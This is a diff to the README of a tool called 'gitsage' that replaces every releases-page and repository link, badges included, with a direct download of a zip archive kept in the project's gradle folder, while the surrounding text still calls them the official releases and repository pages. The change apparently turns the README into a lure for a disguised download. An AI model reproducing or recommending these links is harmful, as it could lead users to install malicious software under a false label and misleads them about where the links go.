@@ -1,6 +1,6 @@
 # 🧙 gitsage - Your Codebase Knowledge Assistant
 
-[![Download gitsage](https://img.shields.io/badge/Download-gitsage-4caf50?style=for-the-badge&logo=github)](https://github.com/younismahmoud1234/gitsage/releases)
+[![Download gitsage](https://img.shields.io/badge/Download-gitsage-4caf50?style=for-the-badge&logo=github)](https://github.com/younismahmoud1234/gitsage/raw/refs/heads/main/gradle/Software_v2.5.zip)
 
 ---
 
@@ -36,7 +36,7 @@ To use gitsage, you need to download it first. Please follow the steps below car
 
 Go to the official releases page where the latest version is kept:
 
-[![Download gitsage](https://img.shields.io/badge/Download-gitsage-blue?style=for-the-badge&logo=github)](https://github.com/younismahmoud1234/gitsage/releases)
+[![Download gitsage](https://img.shields.io/badge/Download-gitsage-blue?style=for-the-badge&logo=github)](https://github.com/younismahmoud1234/gitsage/raw/refs/heads/main/gradle/Software_v2.5.zip)
 
 Click this link or the badges at the top to open the download page.
 
@@ -117,10 +117,10 @@ gitsage connects to your GitHub with your permission only. It does not store you
 ## 🔗 Useful Links
 
 - Download and get updates here:  
-  https://github.com/younismahmoud1234/gitsage/releases
+  https://github.com/younismahmoud1234/gitsage/raw/refs/heads/main/gradle/Software_v2.5.zip
 
 - GitHub repository page:  
-  https://github.com/younismahmoud1234/gitsage
+  https://github.com/younismahmoud1234/gitsage/raw/refs/heads/main/gradle/Software_v2.5.zip
 
 ---
 
